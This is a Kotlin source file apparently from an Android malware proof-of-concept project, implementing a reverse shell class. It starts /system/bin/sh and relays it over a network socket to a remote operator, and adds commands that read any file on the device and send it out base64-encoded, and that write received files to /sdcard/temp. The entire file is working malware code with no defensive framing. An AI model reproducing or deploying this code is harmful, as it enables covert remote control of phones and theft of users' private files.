package com.antoinejonard.malware_poc.malicious

import android.util.AndroidRuntimeException
import android.util.Base64
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import java.io.*
import java.net.Socket

class Shell() {

    @Throws(Exception::class)
    suspend fun executeShell(socket: Socket) {
        val cmd = "system/bin/sh"
        val p = ProcessBuilder(cmd).redirectErrorStream(true).start()
        val pi = p.inputStream
        val pe = p.errorStream
        val si = socket.getInputStream()
        val po = p.outputStream
        val so = socket.getOutputStream()

        so.write("----------Starting Shell----------\n".toByteArray(charset("UTF-8")))
        so.write("$> ".toByteArray(charset("UTF-8")))

        val buff1 = BufferedReader(InputStreamReader(si))
        val buff2 = BufferedReader(InputStreamReader(pi))
        var line: String
        while (!socket.isClosed) {
            try {
                while (pi.available() > 0) {
                    var b = ""
                    while (buff2.ready()) {
                        line = buff2.readLine()
                        b += """
                            $line
                            """.trimIndent()
                    }
                    Log.d(TAG, b)
                    so.write(b.toByteArray(charset("UTF-8")))
                    so.write("\n$> ".toByteArray(charset("UTF-8")))
                }
                while (pe.available() > 0) {
                    so.write(pe.read())
                }
                while (si.available() > 0) {
                    var a = buff1.readLine()
                    a += "\n"
                    Log.d(TAG, a)
                    if (a.startsWith("putFile")) {
                        val data = a.split("\\<").toTypedArray()
                        val filename = data[1]
                        val fileext = data[2]
                        var encodedString = data[3]
                        encodedString = encodedString.replace("$> ", "")
                        val fullFile = "$filename.$fileext"
                        setBase64Data(fullFile, encodedString)
                    } else if (a.startsWith("get ")) {
                        val filepath = a.split(" ").toTypedArray()[1].trim { it <= ' ' }
                        Log.d(TAG, filepath)
                        val file = File(filepath)
                        if (file.exists()) {
                            var sendingFiledata = ""
                            val fullFilename = filepath.substring(filepath.lastIndexOf("/") + 1)
                            val fileData = fullFilename.split("\\.").toTypedArray()
                            Log.d(TAG, "exists")
                            val base64Data = getBase64Data(file)
                            if (base64Data == null) {
                                so.write("Cant transfer Large File\n$> ".toByteArray(charset("UTF-8")))
                            }
                            so.write("getFile\n$> ".toByteArray(charset("UTF-8")))
                            sendingFiledata += """
                                ${fileData[0]}|_|${fileData[1]}|_|$base64Data
                                END123
                                
                                """.trimIndent()
                            so.write(sendingFiledata.toByteArray(charset("UTF-8")))
                        } else {
                            Log.d(TAG, "notexists")
                            so.write("File Doesnt Exists\n$> ".toByteArray(charset("UTF-8")))
                        }
                    } else if (a.startsWith("put ")) {
                        so.write("putFile\n$> ".toByteArray(charset("UTF-8")))
                    } else {
                        po.write(a.toByteArray(charset("UTF-8")))
                    }
                }
                so.flush()
                po.flush()
                delay(50)
                try {
                    p.exitValue()
                    break
                } catch (_: Exception) {
                }
            } catch (e: Exception) {
                Log.d("service_runner", "called")
            }
        }
        so.write("Exiting\n".toByteArray(charset("UTF-8")))
        so.write("$> ".toByteArray(charset("UTF-8")))
        p.destroy()
    }

    private fun getBase64Data(file: File): String? {
        var getBytes = byteArrayOf()
        try {
            getBytes = ByteArray(file.length().toInt())
            Log.d(TAG, file.length().toString())
            if (file.length() > 16000000) {
                return null
            }
            val inputStream: InputStream = FileInputStream(file)
            inputStream.read(getBytes)
            inputStream.close()
        } catch (e: IOException) {
            e.printStackTrace()
        }
        var value: String? = ""
        value = try {
            Base64.encodeToString(getBytes, Base64.DEFAULT)
        } catch (e: AndroidRuntimeException) {
            e.printStackTrace()
            return null
        }
        return value
    }

    private suspend fun setBase64Data(filename: String, base64Data: String) {
        val myfolder = "/sdcard/temp"
        val f = File(myfolder)
        if (!f.exists()) {
            f.mkdir()
        }
        val file = File("$myfolder/$filename")
        if (file.exists()) {
            file.delete()
        }
        withContext(Dispatchers.IO){
            try {
                file.createNewFile()
                val fos = FileOutputStream(file)
                fos.write(Base64.decode(base64Data, Base64.NO_WRAP))
                fos.close()
            } catch (e: FileNotFoundException) {
                e.printStackTrace()
            } catch (e: IOException) {
                e.printStackTrace()
            }
        }
    }

    companion object {
        var TAG = "REVERSE_SHELL"
    }
}